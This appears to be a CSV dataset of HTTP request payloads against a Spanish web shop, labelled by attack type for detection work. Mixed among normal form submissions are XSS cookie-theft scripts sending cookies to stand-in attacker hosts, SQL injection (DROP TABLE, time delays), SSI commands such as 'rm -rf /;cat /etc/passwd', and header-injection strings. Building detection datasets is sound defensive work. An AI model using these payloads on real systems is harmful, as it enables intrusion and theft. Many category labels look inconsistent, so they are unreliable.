payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
insertar | 8962 | %3F HTTP/1.1,cmd,no,30,0,0,0,1,medium
insertar | 8962 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8962 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | ozzy | respuesto | on/ | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
entrar | ozzy | respuesto | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,encoded attack,no,355,0,0,0,0,low
insertar | %00 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
insertar | 5999 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
"registro | herak | v1373948c6a | Malinda | Diclo Ornosa | schull@cursosenlaplaya.ro | 43008564J | Pasaje Arcillero, 177, 2?G | Pedrosa del Reyany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 37874 | Cuenca | 3359754319393302 | Registrar HTTP/1.1",cmd,no,250,0,0,0,1,low
"registro | herak | Set-cookie%3A+Tamper%3D1041264011025374727 | Malinda | Diclo Ornosa | schull@cursosenlaplaya.ro | 43008564J | Pasaje Arcillero, 177, 2?G | Pedrosa del Rey | 37874 | Cuenca | 3359754319393302 | Registrar HTTP/1.1",cmd,no,230,0,0,0,1,low
"registro | herak | v1373948c6a | Malinda | Diclo Ornosa | schull@cursosenlaplaya.ro | A1A28731H | Pasaje Arcillero, 177, 2?G | Pedrosa del Rey | 37874 | Cuenca | 3359754319393302 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
"registro | herak | v1373948c6a | Malinda | Diclo Ornosa | schull@cursosenlaplaya.ro | 43008564J | Pasaje Arcillero, 177, 2?G | Pedrosa del Rey | 37874 | Cuenca | 3359754319393302 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
"insertar | 898 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,79,1,0,0,1,medium
bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | 898 | Confirmar HTTP/1.1,xss,no,75,0,1,0,1,medium
insertar | 898 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 898 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
"registro | phillie | 0t8r2a1e | Elsio | Surinyac Rocamora | jordan@indusmecortiz.se | 25966835L | Calle Pedro De Lorenzo 118, 1?B | Lizartza | 48111 | La Rioja | 8653006261753746 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
Vaciar carrito%20 HTTP/1.1,encoded attack,no,26,0,0,0,0,high
"entrar | arro | CarMinAR<!--#include file=""archivo_secreto"" --> | on | Entrar HTTP/1.1",sql,no,86,1,1,0,1,low
"entrar | <SCRIPT>alert(""Paros"");</SCRIPT> | CarMinAR | on | Entrar HTTP/1.1",xss,no,75,1,1,0,1,medium
entrar | sh*armila3 | CarMinAR | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | arro | CarMinAR | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
"1<!--#include file=""archivo_secreto"" --> HTTP/1.1",sql,no,49,1,1,0,0,medium
Credenciales incorrectas| HTTP/1.1,cmd,no,34,0,0,0,1,medium
insertar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | 5832 | Pasar por caja HTTP/1.1,cmd,no,93,0,0,0,1,low
? | 5832 | Pasar por caja HTTP/1.1,cmd,no,34,0,0,0,1,medium
insertar | 5832 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
"registro | casey | parasceve | Remi'g/*io | Montras Handal | mukherjee@mcfly.cat | 75875960H | Argentina 127,  | Villaviudas | 08254 | Guadalajara | 3976120192503130 | Registrar HTTP/1.1",cmd,no,186,1,0,0,1,low
entrar | paqs | coNMut6BLE | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Entrar HTTP/1.1,cmd,no,98,0,0,0,1,low
entrar | eme+r | coNMut6BLE | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | paqs | coNMut6BLE | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | 405 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 405 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | waltdisn | AC4iNiA | Yasmila | Monerris Brau | dearden@hipermadrid.ga | 83203700G | C/ Flors, 115  | Navas de Orosessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | 32782 | Zaragoza | 0851365114838541 | Registrar HTTP/1.1",xss,no,317,1,1,0,1,low
"registro | waltdisn | AC4iNiA | Yasmila | Monerris Brau | dearden@hipermadrid.ga | 83203700G | C/ Flors, 115  | Navas de Oro | 1642A | Zaragoza | 0851365114838541 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
"registro | waltdisn | AC4iNiA | Yasmila | Monerris Brau | dearden@hipermadrid.ga | 83203700G | C/ Flors, 115  | Navas de Oro | 32782 | Zaragoza | 0851365114838541 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
Vaciar carritoSet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,65,0,0,0,0,medium
"registro | julee | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Basiana | Fiesco Terrazas | wakefield.yniguez@aebo.so | 43471294Y | C/ Santa Florentina 9, 11?H | Asparrena | 16841 | Lleida | 6355628611222298 | Registrar HTTP/1.1",cmd,no,240,0,0,0,1,low
"registro | li*bor7 | al9u12z3 | Basiana | Fiesco Terrazas | wakefield.yniguez@aebo.so | 43471294Y | C/ Santa Florentina 9, 11?H | Asparrena | 16841 | Lleida | 6355628611222298 | Registrar HTTP/1.1",cmd,no,196,0,0,0,1,low
"registro | julee | al9u12z3 | Basiana | Fiesco Terrazas | wakefield.yniguez@aebo.so | 43471294Y | C/ Santa Florentina 9, 11?H | Asparrena | 16841 | Lleida | 6355628611222298 | Registrar HTTP/1.1",cmd,no,194,0,0,0,1,low
entrar | trahan' AND '1'='1 | 72513662r719 | off | Entrar HTTP/1.1,cmd,no,66,1,0,0,1,medium
entrar | trahan | 72513662r719 | on/ | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
1'OR'a='a HTTP/1.1,other,no,18,1,0,0,0,high
insertar | 9702 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 9702 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
'OR'a='a HTTP/1.1,other,no,17,1,0,0,0,high
"entrar | satta | es699601r | on<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Entrar HTTP/1.1",sql,no,93,1,1,0,1,low
"entrar | c?hak-ho,n | es699601r | on | Entrar HTTP/1.1",cmd,no,54,0,0,0,1,medium
2sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,144,1,1,0,0,low
any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A HTTP/1.1,encoded attack,no,69,0,0,0,0,medium
insertar | 6500 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 6500 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | mccarron | revistero | Adelqui | Valente Sanchis','0');waitfor delay '0:0:15';-- | gargen@007tv.zw | 83296238J | C/ Fuente Morena, 146,  | Rillo | 17752 | Lleida | 3359754319393302 | Registrar HTTP/1.1",sql,no,212,1,0,0,1,low
"registro | mccarron | revistero | Adelqui | Valente Sanchis | gargen@007tv.zw | 83296238J | C/ Fuente Morena, 146,  | Rillo | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Lleida | 3359754319393302 | Registrar HTTP/1.1",cmd,no,229,0,0,0,1,low
"registro | s??u?le | revistero | Adelqui | Valente Sanchis | gargen@007tv.zw | 83296238J | C/ Fuente Morena, 146,  | Rillo | 17752 | Lleida | 3359754319393302 | Registrar HTTP/1.1",cmd,no,179,0,0,0,1,low
"registro | mccarron | revistero | Adelqui | Valente Sanchis | gargen@007tv.zw | 83296238J | C/ Fuente Morena, 146,  | Rillo | 17752 | Lleida | 3359754319393302 | Registrar HTTP/1.1",cmd,no,180,0,0,0,1,low
';waitfor delay '0:0:15';-- HTTP/1.1,sql,no,36,1,0,0,1,medium
"registro | bibbye | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Darian | Ospina Soma | swofford@showcars.com.nr | 37457070Y | Maria Cortina i Pascual S/N,  | Berrocalejo de Aragona | 07669 | Guadalajara | 6457209412215261 | Registrar HTTP/1.1",cmd,no,252,0,0,0,1,low
entrar | w/id**rig | GuSTosA | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | klapper | GuSTosA | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
1? HTTP/1.1,other,no,11,0,0,0,0,high
Credenciales incorrectas? HTTP/1.1,other,no,34,0,0,0,0,medium
insertar | 9036 | Confirmarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,cmd,no,90,0,0,0,1,low
insertar | 9036 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 9036 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"entrar | mathews | 6u1ad5<SCRIPT>alert(""Paros"");</SCRIPT> | on | Entrar HTTP/1.1",xss,no,80,1,1,0,1,low
entrar | mathews | 6u1ad5 | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
"insertar"" AND ""1""=""1 | 31 | Confirmar HTTP/1.1",cmd,no,46,1,0,0,1,medium
insertar | 31 | Pasar por caja/ HTTP/1.1,cmd,no,40,0,0,0,1,medium
insertar | 31 | Confirmar HTTP/1.1,cmd,no,34,0,0,0,1,medium
Vaciar carritoany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,encoded attack,no,74,0,0,0,0,medium
Set-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,51,0,0,0,0,medium
"Credenciales incorrectas"" AND ""1""=""1 HTTP/1.1",other,no,45,1,0,0,0,medium
%7C HTTP/1.1,encoded attack,no,12,0,0,0,0,high
"insertar | 795 | Pasar por caja','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,80,1,0,0,1,low
insertar | 795 | %00 HTTP/1.1,cmd,no,29,0,0,0,1,high
insertar | 795 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 795 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | erdinc | 3e39a62r | Haroidsessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | Peldoza Restrepo | valentic@programagestionerp.ma | 91385141T | Calle Alhama De Granada, 164,  | Olmedilla de Eliz | 07142 | Cantabria | 1803474685764017 | Registrar HTTP/1.1",cmd,no,560,0,0,0,1,low
"registro | erdinc | 3e39a62r | Haroid | Peldoza Restrepo | dennehy@e@xpozarago@zafloral2014.ls | 91385141T | Calle Alhama De Granada, 164,  | Olmedilla de Eliz | 07142 | Cantabria | 1803474685764017 | Registrar HTTP/1.1",cmd,no,219,0,0,0,1,low
3 | Queso Manchego | 39 | 9 | 'INJECTED_PARAM HTTP/1.1,cmd,no,54,1,0,0,1,medium
entrar | shari | AGobiadO | on | Entrar' DELETE FROM USERS HTTP/1.1,cmd,no,67,1,0,0,1,medium
entrar | shari | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | on | Entrar HTTP/1.1,cmd,no,100,0,0,0,1,low
"entrar | shari | al301t4r51lad,8 | on | Entrar HTTP/1.1",cmd,no,55,0,0,0,1,medium
entrar | shari | AGobiadO | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
2%7C HTTP/1.1,encoded attack,no,13,0,0,0,0,high
%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1,encoded attack,no,61,0,0,0,0,medium
insertar | 9510 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 9510 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | hurwitz | P7rdUlarIo | Yasmila | Raquer De la Poza | kober@sindns.ve | 24117332S | Calle Barri Trinitat Nova, S/N, 13D | Parra de las Vegas, La | 12709 | Z+am.+ora | 1828745224462815 | Registrar HTTP/1.1",cmd,no,214,0,0,0,1,low
registro | okai | 3ra41 | Custodio | Hernandez Agudelo | schiaftino@showenvivo.com.sy | 49372725M | Plza. Olavide 47 13E | Abejuela | 25551 | Madrid | 3180844936634002 | AND 1=1 HTTP/1.1,cmd,no,186,0,0,0,1,low
registro | okai | 3ra41 | -Re'th | Hernandez Agudelo | schiaftino@showenvivo.com.sy | 49372725M | Plza. Olavide 47 13E | Abejuela | 25551 | Madrid | 3180844936634002 | Registrar HTTP/1.1,cmd,no,186,1,0,0,1,low
registro | okai | 3ra41 | Custodio | Hernandez Agudelo | schiaftino@showenvivo.com.sy | 49372725M | Plza. Olavide 47 13E | Abejuela | 25551 | Madrid | 3180844936634002 | Registrar HTTP/1.1,cmd,no,188,0,0,0,1,low
entrar | nancie | %2B | on | Entrar HTTP/1.1,cmd,no,44,0,0,0,1,medium
entrar | nancie | Pl0NTo | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,encoded attack,no,70,1,0,0,0,medium
insertar | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Pasar por caja HTTP/1.1,xss,no,171,1,1,0,1,low
insertar | 2832 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 2832 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | ?denise | pLaSMaDoR | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | cicci | pLaSMaDoR | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
%2B HTTP/1.1,encoded attack,no,12,0,0,0,0,high
%00 | 950 | Confirmar HTTP/1.1,cmd,no,30,0,0,0,1,medium
insertar | 950 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 950 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
"registro | dido | enmarch3tar | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1",sql,no,258,1,0,0,1,low
"registro | dido | i,nt32n/1773n'02a | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | Registrar HTTP/1.1",cmd,no,209,1,0,0,1,low
"registro | dido | enmarch3tar | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
entrar | doro | !FIlateliasessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | off | Entrar HTTP/1.1,cmd,no,396,0,0,0,1,low
entrar | 'INJECTED_PARAM | !FIlatelia | off | Entrar HTTP/1.1,cmd,no,61,1,0,0,1,medium
entrar | r*e'gg+is | !FIlatelia | off | Entrar HTTP/1.1,cmd,no,55,1,0,0,1,medium
entrar | doro | !FIlatelia | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
Credenciales incorrectasany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A HTTP/1.1,encoded attack,no,93,0,0,0,0,low
insertar | 6851 | Confirmar+ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6851 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6851 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | brooksba | papilla | on | Entrar HTTP/1.1,cmd,no,95,0,0,0,1,low
entrar | brooksba | foR'6ero | on | Entrar HTTP/1.1,cmd,no,51,1,0,0,1,medium
entrar | brooksba | papilla | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
"1""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,36,1,1,0,0,medium
? HTTP/1.1,other,no,10,0,0,0,0,high
insertar | 4373 | Pasar por cajaAND 1=1 HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 4373 | ? HTTP/1.1,cmd,no,28,0,0,0,1,high
insertar | 4373 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 4373 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | lorrayne | anofele6 | Neliana | Monllor Mascort | tsaganeas@mccomptables.my | 26431261Y | Calle Begonia 47,  | Recuenco, El | 44168 | Salamanca | 7168408229054610paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | Registrar HTTP/1.1",cmd,no,276,0,0,0,1,low
"registro | lorrayne | anofele6 | Neliana | Monllor Mascort | tsaganeas@mccomptables.my | 26431261Y | Calle Begonia 47,  | Recuenco, El | 44168 | Guad?ala/jar?a | 7168408229054610 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
"registro | lorrayne | anofele6 | Neliana | Monllor Mascort | tsaganeas@mccomptables.my | 26431261Y | Calle Begonia 47,  | Recuenco, El | 44168 | Salamanca | 7168408229054610 | Registrar HTTP/1.1",cmd,no,194,0,0,0,1,low
entrar%20 | sundar | rEsPEtOSA | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
"entrar | sundar | /,g,Il | on | Entrar HTTP/1.1",cmd,no,47,0,0,0,1,medium
entrar | sundar | rEsPEtOSA | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar | 9567 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 9567 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"entrar | espinosa | candado | off','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1",sql,no,87,1,0,0,1,low
"entrar | espinosa | candado | <!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1",sql,no,71,1,1,0,1,medium
entrar | espinosa | candado | off/ | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | espinosa | candado | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,63,0,0,0,0,medium
insertar | 2373 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
entrar | riccitel | aprisCar | on | Entrar%20 HTTP/1.1,cmd,no,54,0,0,0,1,medium
entrar | riccitel | aprisCar | %7C | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | riccitel | aprisCar | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar | 2352 | Confirmar%3F HTTP/1.1,cmd,no,39,0,0,0,1,medium
insertar | 2352 | ' AND '1'='1 HTTP/1.1,cmd,no,39,1,0,0,1,medium
insertar | 2352 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 2352 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | houston | 8n885rado | Salvino | Ivanco Casola | galli_amagula@hotelesjerez.lc | 53532197L | Calle Memorias, 21, sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | Artesa de Segre | 05571 | Burgos | 3983408909914725 | Registrar HTTP/1.1",cmd,no,544,0,0,0,1,low
registro | houston | 8n885rado | Salvino | Ivanco Casola | galli_amagula@hotelesjerez.lc | 53532197L | %00 | Artesa de Segre | 05571 | Burgos | 3983408909914725 | Registrar HTTP/1.1,cmd,no,181,0,0,0,1,low
"registro | houston | 8n885rado | Salvino | Ivanco Casola | galli_amagula@hotelesjerez.lc | 53532197L | Calle Memorias, 21,  | Artesa de Segre | 05571 | Burgos | 3983408909914725 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
entrar | befanis | PiSoneAR | off | Entrar%7C HTTP/1.1,cmd,no,54,0,0,0,1,medium
+ | befanis | PiSoneAR | off | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
entrar | befanis | PiSoneAR | on/ | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | befanis | PiSoneAR | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar | 8083 | Confirmarany%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,cmd,no,84,0,0,0,1,low
insertar | 8083 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8083 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"Vaciar carrito','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,63,1,0,0,1,medium
entrar | +jay | pre7u5t05a | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | ker | pre7u5t05a | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
2AND 1=1 HTTP/1.1,other,no,17,0,0,0,0,high
any%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,57,0,0,0,0,medium
insertar | 5500 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5500 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | soliman | 85r7a4c2 | Shiirly | Margarit Gallardo | asther@ringringrent.bj | 718619A7P | Navalafuente, 42  | Santa Cruz de Pinares | 37510 | Zaragoza | 6014094757095594 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
"registro | soliman | 85r7a4c2 | Shiirly | Margarit Gallardo | asther@ringringrent.bj | 20514170X | Navalafuente, 42  | Santa Cruz de Pinares | 37510 | Zaragoza | 6014094757095594 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
entrar%2B | meridith | oidorA | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | meridith | oidorA | on/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | meridith | oidorA | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
1paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,encoded attack,no,92,0,0,0,0,low
"','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,49,1,0,0,1,medium
"Credenciales incorrectas<!--#include file=""archivo_secreto"" --> HTTP/1.1",sql,no,72,1,1,0,0,medium
insertar | 1328any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | Pasar por caja HTTP/1.1,cmd,no,101,0,0,0,1,low
insertar | 1328 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1328 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | kevyn | a6el1Ido | Saba | Ache | davray.chayevsky4@sierradealcaraz.um | 02401008S | Paseo Chil 19, 9-H | Sotodosos | 05115 | Valencia | 638571027216087 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
"registro | kevyn | a6el1Ido | Saba | Ache | davray.chayevsky4@sierradealcaraz.um | 02401008S | Paseo Chil 19, 9-H | Sotodosos | 05115 | Valencia | 2281646357474752 | Registrar HTTP/1.1",cmd,no,184,0,0,0,1,low
Vaciar carrito@40 HTTP/1.1,other,no,26,0,0,0,0,high
"registro | slaby | 3a91io | Niseas | Paiva Romera | owens@provider.com.br | 74056042K | Aigua Marina 91, %3F | Chercos | 40421 | Segovia | 8044294456559903 | Registrar HTTP/1.1",cmd,no,176,0,0,0,1,low
"sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | slaby | 3a91io | Niseas | Paiva Romera | owens@provider.com.br | 74056042K | Aigua Marina 91,  | Chercos | 40421 | Segovia | 8044294456559903 | Registrar HTTP/1.1",cmd,no,511,0,0,0,1,low
"registro | slaby | 3a91io | Niseas | Paiva Romera | owens@provider.com.br | 74056042K | Aigua Marina 91,  | Chercos | 40421 | Segovia | 8044294456559903 | Registrar HTTP/1.1",cmd,no,173,0,0,0,1,low
entrar | dagmar | t8ipoy | off | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 6715bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Pasar por caja HTTP/1.1,xss,no,89,0,1,0,1,low
insertar | 'INJECTED_PARAM | Pasar por caja HTTP/1.1,cmd,no,52,1,0,0,1,medium
insertar | 6715 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6715 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
